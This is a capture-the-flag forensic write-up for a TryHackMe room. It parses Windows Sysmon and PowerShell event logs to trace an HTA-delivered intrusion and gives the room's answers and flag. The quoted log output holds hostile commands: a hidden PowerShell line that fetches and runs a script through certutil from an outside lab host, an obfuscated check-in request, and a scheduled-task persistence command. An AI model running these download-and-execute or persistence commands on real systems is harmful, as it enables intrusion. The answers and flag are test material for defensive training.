# TryHackMe — Handbook for the Recently Compromised (Complete Technical Write-Up)

- **Room**: Handbook for the Recently Compromised
- **Category**: DFIR / Windows Event Log Analysis (`.evtx`) & MITRE ATT&CK Mapping
- **Artifacts in Repo**:
  - [`artifacts.tar.gz`](./artifacts.tar.gz) (`11,041,706` bytes)
  - [`solve.py`](./solve.py) (Automated `.evtx` JSONL parser, timeline extractor, and Base64 flag decoder)

---

## 1. Artifact Inventory & Extraction

First, we inspected `artifacts.tar.gz` and extracted its contents:

### Command Executed
```bash
mkdir -p handbookfortherecentlycompromised \
  && cd handbookfortherecentlycompromised \
  && tar -tzvf ../artifacts.tar.gz \
  && tar -xzf ../artifacts.tar.gz
```

### Output
```text
drwxr-xr-x ubuntu/ubuntu     0 2026-10-20 10:25 ./artifacts/
drwxr-xr-x ubuntu/ubuntu     0 2026-10-22 01:33 ./artifacts/tools/
drwxrwxr-x ubuntu/ubuntu     0 2026-10-22 01:33 ./artifacts/tools/licenses/
-rw-rw-r-- ubuntu/ubuntu 11357 2026-10-22 01:33 ./artifacts/tools/licenses/evtx_dump-LICENSE-APACHE.txt
-rw-rw-r-- ubuntu/ubuntu  1080 2026-10-22 01:33 ./artifacts/tools/licenses/evtx_dump-LICENSE-MIT.txt
-rwxr-xr-x ubuntu/ubuntu 3166448 2026-10-20 10:25 ./artifacts/tools/evtx_dump
drwxrwxr-x ubuntu/ubuntu       0 2026-10-20 10:36 ./artifacts/tools/attack-reference/
-rw-rw-r-- ubuntu/ubuntu 55271014 2026-10-20 10:35 ./artifacts/tools/attack-reference/enterprise-attack.json
-rw-rw-r-- ubuntu/ubuntu     1354 2026-10-20 10:35 ./artifacts/tools/attack-reference/LICENSE.txt
-rw-rw-r-- ubuntu/ubuntu    21115 2026-10-20 10:36 ./artifacts/tools/attack-reference/enterprise-techniques.tsv
-rw-rw-r-- ubuntu/ubuntu    69632 2026-10-02 01:51 ./artifacts/PowerShell-Operational.evtx
-rw-rw-r-- ubuntu/ubuntu  1118208 2026-10-02 01:50 ./artifacts/Microsoft-Windows-Sysmon%4Operational.evtx
```

The archive provides:
1. **`Microsoft-Windows-Sysmon%4Operational.evtx`**: Sysmon Operational logs (process creations, file creations, network connections).
2. **`PowerShell-Operational.evtx`**: Windows PowerShell Operational logs (Script Block Logging — Event ID `4104`).
3. **`./artifacts/tools/evtx_dump`**: Rust binary utility to convert binary `.evtx` files into JSON Lines (`-o jsonl`).
4. **`./artifacts/tools/attack-reference/enterprise-techniques.tsv`**: MITRE ATT&CK Enterprise techniques & sub-techniques lookup table.

---

## 2. Converting & Parsing `.evtx` Logs (`Sysmon` & `PowerShell`)

### Step 2.1 — Convert `.evtx` to `.jsonl` with `evtx_dump`
```bash
./artifacts/tools/evtx_dump -o jsonl ./artifacts/Microsoft-Windows-Sysmon%4Operational.evtx > sysmon.jsonl
./artifacts/tools/evtx_dump -o jsonl ./artifacts/PowerShell-Operational.evtx > powershell.jsonl
```

### Step 2.2 — Parse Sysmon Process Creation Events (`Event ID 1`)
```bash
python3 -c '
import json

for line in open("sysmon.jsonl"):
    line = line.strip()
    if not line or line.startswith("Record "):
        continue
    try:
        ev = json.loads(line)
        sys_info = ev["Event"]["System"]
        eid = sys_info["EventID"]
        if isinstance(eid, dict):
            eid = eid.get("#text")
        ed = ev["Event"].get("EventData", {})
        if eid == 1:
            print(f"[Sysmon EID 1] Time={sys_info[\"TimeCreated\"][\"#attributes\"][\"SystemTime\"]} Image={ed.get(\"Image\")} OriginalFileName={ed.get(\"OriginalFileName\")} ParentImage={ed.get(\"ParentImage\")}\n  Cmd={ed.get(\"CommandLine\")}\n  ParentCmd={ed.get(\"ParentCommandLine\")}\n")
    except Exception:
        pass
'
```

#### Key Sysmon Event ID 1 Output (Intrusion Timeline)
```text
[Sysmon EID 1] Time=2026-10-02T05:02:05.239631Z Image=C:\Windows\SysWOW64\mshta.exe OriginalFileName=MSHTA.EXE ParentImage=C:\Windows\explorer.exe
  Cmd="C:\Windows\SysWOW64\mshta.exe" "C:\Users\j.collins\Downloads\pipeline-check.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} 
  ParentCmd=C:\Windows\Explorer.EXE

[Sysmon EID 1] Time=2026-10-02T05:02:05.481301Z Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe OriginalFileName=PowerShell.EXE ParentImage=C:\Windows\SysWOW64\mshta.exe
  Cmd="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1"
  ParentCmd="C:\Windows\SysWOW64\mshta.exe" "C:\Users\j.collins\Downloads\pipeline-check.hta" {1E460BD7-F1C3-4B2E-88BF-4E770A288AF5}{1E460BD7-F1C3-4B2E-88BF-4E770A288AF5} 

[Sysmon EID 1] Time=2026-10-02T05:02:06.831551Z Image=C:\Windows\SysWOW64\certutil.exe OriginalFileName=CertUtil.exe ParentImage=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
  Cmd="C:\Windows\System32\certutil.exe" -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 C:\Users\J1B0B~1.COL\AppData\Local\Temp\pipeline-sync.ps1
  ParentCmd="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1"

[Sysmon EID 1] Time=2026-10-02T05:02:06.976549Z Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe OriginalFileName=PowerShell.EXE ParentImage=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
  Cmd="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -f C:\Users\J1B0B~1.COL\AppData\Local\Temp\pipeline-sync.ps1
  ParentCmd="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -nop -w hidden -c "& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1"

[Sysmon EID 1] Time=2026-10-02T05:02:08.210969Z Image=C:\Windows\SysWOW64\schtasks.exe OriginalFileName=schtasks.exe ParentImage=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
  Cmd="C:\Windows\system32\schtasks.exe" /create /tn StudioPipelineSync /tr "powershell -nop -w hidden -f C:\Users\j.collins\AppData\Roaming\PipelineSync\pipeline-sync.ps1" /sc onlogon /rl highest /f
  ParentCmd="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass -f C:\Users\J1B0B~1.COL\AppData\Local\Temp\pipeline-sync.ps1
```

---

### Step 2.3 — Parse PowerShell Script Block Logs (`Event ID 4104`)
```bash
python3 -c '
import json
for line in open("powershell.jsonl"):
    line = line.strip()
    if not line or line.startswith("Record "):
        continue
    try:
        ev = json.loads(line)
        eid = ev["Event"]["System"]["EventID"]
        if isinstance(eid, dict): eid = eid.get("#text")
        ed = ev["Event"].get("EventData", {})
        sb = ed.get("ScriptBlockText", "")
        if sb and ("pipeline" in sb.lower() or "certu" in sb.lower() or "schtasks" in sb.lower() or "http" in sb.lower()):
            print(f"=== EID {eid} Time={ev[\"Event\"][\"System\"][\"TimeCreated\"][\"#attributes\"][\"SystemTime\"]} Path={ed.get(\"Path\")} ===")
            print(sb)
    except Exception:
        pass
'
```

#### Output
```powershell
=== EID 4104 Time=2026-10-02T05:02:06.508148Z Path= ===
& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1

=== EID 4104 Time=2026-10-02T05:02:07.744314Z Path=C:\Users\j.collins\AppData\Local\Temp\pipeline-sync.ps1 ===
try { Invoke-WebRequest -Uri (-join('htt','p://pip','el','ine','-cdn.th','m:','808','8/check','in')) -UseBasicParsing -TimeoutSec 3 | Out-Null } catch {}
schtasks /create /tn ('S'+'tu'+'dioPi'+'pe'+'li'+'neSyn'+'c') /tr (-join('pow','e','rshe','l','l -nop',' -','w hi','dden -','f C:\U','se','rs\j','.','collins','\AppDat','a\Roamin','g\Pipeli','neSyn','c\','pi','pelin','e-sync','.p','s','1')) /sc onlogon /rl highest /f
$blob = ('VEhNe3R'+'IM19Ha'+'D'+'BzdF93MX'+'RIX1Ro'+'M19'+'NMDVUfQ='+'=')
$flag = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob))
$dir = ($env:TEMP + ('\Pipe'+'lineS'+'ync'))
New-Item $dir -ItemType Directory -Force | Out-Null
Set-Content ($dir + ('\.sy'+'nc-c'+'ach'+'e')) $flag
```

---

## 3. Questions & Detailed Answers

### Question 1
> **A trusted Windows utility downloaded a second-stage script onto the host. The command that called the utility obscured its name with a wildcard. What is the utility’s full executable name?**

- **Answer**: **`certutil.exe`**
- **Analysis**:
  - The initial `mshta.exe` execution spawned PowerShell with `& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f ...`.
  - Sysmon Event ID `1` at `2026-10-02T05:02:06.831551Z` shows the wildcard resolved to `"C:\Windows\System32\certutil.exe"` (`OriginalFileName=CertUtil.exe`).

---

### Question 2
> **What full URL did the utility retrieve the second-stage script from?**

- **Answer**: **`http://pipeline-cdn.thm:8088/pipeline-sync.ps1`**
- **Analysis**:
  - Recorded directly in the `certutil.exe` command line (`Sysmon EID 1` at `2026-10-02T05:02:06.831551Z`):
    ```cmd
    "C:\Windows\System32\certutil.exe" -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 C:\Users\J1B0B~1.COL\AppData\Local\Temp\pipeline-sync.ps1
    ```

---

### Question 3
> **Which MITRE ATT&CK sub-technique describes the abuse of the Windows scripting host that executed the initial attachment?**

- **Answer**: **`T1218.005`** *(System Binary Proxy Execution: Mshta)*
- **Command & Lookup**:
  ```bash
  $ grep -iE 'mshta|1218' ./artifacts/tools/attack-reference/enterprise-techniques.tsv
  T1218	System Binary Proxy Execution
  ...
  T1218.005	Mshta
  ```
- **Analysis**:
  - User `j.collins` executed `C:\Users\j.collins\Downloads\pipeline-check.hta` via `C:\Windows\SysWOW64\mshta.exe` (`Sysmon EID 1` at `2026-10-02T05:02:05.239631Z`).

---

### Question 4
> **Which MITRE ATT&CK sub-technique describes the persistence mechanism the intruder configured?**

- **Answer**: **`T1053.005`** *(Scheduled Task/Job: Scheduled Task)*
- **Command & Lookup**:
  ```bash
  $ grep -iE 'scheduled|1053' ./artifacts/tools/attack-reference/enterprise-techniques.tsv
  T1029	Scheduled Transfer
  T1053	Scheduled Task/Job
  T1053.002	At
  T1053.003	Cron
  T1053.005	Scheduled Task
  T1053.006	Systemd Timers
  T1053.007	Container Orchestration Job
  ```
- **Analysis**:
  - The second-stage script `pipeline-sync.ps1` invoked `schtasks.exe` (`Sysmon EID 1` at `2026-10-02T05:02:08.210969Z`) to create a logon scheduled task named `StudioPipelineSync` running with highest privileges (`/sc onlogon /rl highest /f`).

---

### Question 5
> **What is the flag?**

- **Answer**: **`THM{tH3_Gh0st_w1tH_Th3_M05T}`**
- **Command & Decoding**:
  In `PowerShell-Operational.evtx` (Event ID `4104` at `2026-10-02T05:02:07.744314Z`), `pipeline-sync.ps1` reconstructs a Base64 string via string concatenation and writes the decoded UTF-8 flag to `$env:TEMP\PipelineSync\.sync-cache`:
  ```python
  python3 -c '
  import base64
  blob = "VEhNe3R" + "IM19Ha" + "D" + "BzdF93MX" + "RIX1Ro" + "M19" + "NMDVUfQ=" + "="
  print("Concatenated Base64:", blob)
  print("Decoded Flag:", base64.b64decode(blob).decode())
  '
  ```
  Output:
  ```text
  Concatenated Base64: VEhNe3RIM19HaDBzdF93MXRIX1RoM19NMDVUfQ==
  Decoded Flag: THM{tH3_Gh0st_w1tH_Th3_M05T}
  ```
